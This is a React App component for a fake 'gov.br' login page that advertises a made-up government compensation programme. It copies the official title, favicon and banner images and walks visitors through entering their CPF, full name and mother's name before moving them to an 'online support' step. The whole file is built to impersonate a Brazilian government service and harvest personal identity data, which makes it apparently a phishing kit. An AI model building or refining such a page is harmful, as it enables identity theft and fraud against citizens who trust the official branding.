import React, { useEffect, useState } from 'react';
import Header from './components/Header';
import LoginForm from './components/LoginForm';
import UserDataConfirmation from './components/UserDataConfirmation';
import OnlineSupport from './components/OnlineSupport';
import SecurityInfo from './components/SecurityInfo';
import Footer from './components/Footer';

interface UserData {
  nome: string;
  mae: string;
  cpf: string;
}

function App() {
  const [currentStep, setCurrentStep] = useState(1);
  const [userData, setUserData] = useState<UserData | null>(null);
  const [urlParams, setUrlParams] = useState<URLSearchParams>();

  useEffect(() => {
    document.title = 'Entrar com gov.br';
    
    const favicon = document.querySelector('link[rel="icon"]') as HTMLLinkElement;
    if (favicon) {
      favicon.href = 'https://www.gov.br/++theme++padrao_govbr/favicons/favicon.ico';
    }

    // Get URL parameters on initial load
    const params = new URLSearchParams(window.location.search);
    setUrlParams(params);

    // If we have CPF and nome in URL, try to auto-advance
    const cpf = params.get('cpf');
    const nome = params.get('nome');
    if (cpf && nome) {
      setUserData({ cpf, nome, mae: params.get('mae') || '' });
      setCurrentStep(params.get('step') ? parseInt(params.get('step')!) : 1);
    }
  }, []);

  const updateUrlParams = (newData: Partial<UserData>, step?: number) => {
    const newParams = new URLSearchParams(window.location.search);
    Object.entries(newData).forEach(([key, value]) => {
      if (value) {
        newParams.set(key, key === 'cpf' ? value.replace(/\D/g, '') : value);
      }
    });
    if (step) {
      newParams.set('step', step.toString());
    }
    window.history.replaceState({}, '', `${window.location.pathname}?${newParams}`);
    setUrlParams(newParams);
  };

  const handleUserDataReceived = (data: UserData) => {
    setUserData(data);
    setCurrentStep(2);
    updateUrlParams(data, 2);
  };

  const handleConfirmData = () => {
    if (userData) {
      setCurrentStep(3);
      updateUrlParams(userData, 3);
    }
  };
  
  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <picture className="w-full">
        <source
          media="(max-width: 768px)"
          srcSet="https://www.gov.br/pt-br/pagina-inicial/@@collective.cover.banner/b2cade03-e30d-4b29-84a9-8930897c664c/@@images/4cd296a3-16a2-4a67-9907-b83bddc49151.jpeg"
        />
        <source
          media="(min-width: 769px)"
          srcSet="https://www.gov.br/pt-br/pagina-inicial/@@collective.cover.banner/b5d73c53-a395-4e8a-8cce-b600b42e51ef/@@images/d50110b4-ddf3-464d-afd3-397be526cb23.jpeg"
        />
        <img 
          src="https://www.gov.br/pt-br/pagina-inicial/@@collective.cover.banner/b5d73c53-a395-4e8a-8cce-b600b42e51ef/@@images/d50110b4-ddf3-464d-afd3-397be526cb23.jpeg"
          alt="Banner Gov.br"
          className="w-full h-48 object-cover"
        />
      </picture>

      <div className="bg-white py-8 border-b">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-[#1351B4] text-center mb-6">
            Programa Indenizatório do Governo
          </h1>
          
          <div className="max-w-2xl mx-auto">
            <h2 className="text-xl font-semibold text-gray-800 mb-4">
              Como verificar se você possui direito à indenização:
            </h2>
            
            <ol className="space-y-4">
              <li className="flex items-start">
                <span className="flex-shrink-0 w-8 h-8 bg-[#1351B4] text-white rounded-full flex items-center justify-center font-semibold">
                  1
                </span>
                <div className="ml-4">
                  <p className="text-gray-700">Digite seu CPF no campo abaixo para verificar se você tem direito ao benefício.</p>
                </div>
              </li>
              <li className="flex items-start">
                <span className="flex-shrink-0 w-8 h-8 bg-[#1351B4] text-white rounded-full flex items-center justify-center font-semibold">
                  2
                </span>
                <div className="ml-4">
                  <p className="text-gray-700">Aguarde enquanto nosso sistema verifica seus dados no banco de dados do programa.</p>
                </div>
              </li>
              <li className="flex items-start">
                <span className="flex-shrink-0 w-8 h-8 bg-[#1351B4] text-white rounded-full flex items-center justify-center font-semibold">
                  3
                </span>
                <div className="ml-4">
                  <p className="text-gray-700">Se você tiver direito, receberá as instruções para prosseguir com o processo indenizatório.</p>
                </div>
              </li>
            </ol>
          </div>
        </div>
      </div>
      
      <main className="flex-grow container mx-auto px-4 py-8 flex flex-col items-center justify-center">
        {currentStep === 1 && (
          <>
            <LoginForm 
              onUserDataReceived={handleUserDataReceived} 
              initialCPF={urlParams?.get('cpf') || ''}
            />
            <SecurityInfo />
          </>
        )}
        {currentStep === 2 && userData && (
          <UserDataConfirmation 
            userData={userData} 
            onConfirm={handleConfirmData}
          />
        )}
        {currentStep === 3 && userData && (
          <OnlineSupport 
            cpf={userData.cpf} 
            nome={userData.nome}
            urlParams={urlParams}
          />
        )}
      </main>
      
      <Footer />
    </div>
  );
}

export default App;